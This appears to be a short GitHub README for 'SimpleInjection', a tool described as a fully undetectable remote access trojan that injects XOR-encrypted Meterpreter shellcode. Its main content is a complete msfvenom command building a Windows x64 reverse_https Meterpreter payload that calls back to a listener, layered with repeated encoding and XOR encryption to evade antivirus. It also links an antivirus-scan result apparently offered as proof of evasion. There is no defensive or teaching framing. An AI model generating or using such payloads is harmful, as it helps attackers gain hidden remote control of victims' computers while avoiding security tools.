# SimpleInjection
FUD RAT (Xor encrypted Meterpreter, shellcode injector)

to generate shellcode:

msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.56.1 lport=4444 -e x64/zutto_dekiru -i 20 --encrypt xor --encrypt-key byte4RR4Y -f csharp


https://antiscan.me/images/result/7R5CcVwJfzn3.png
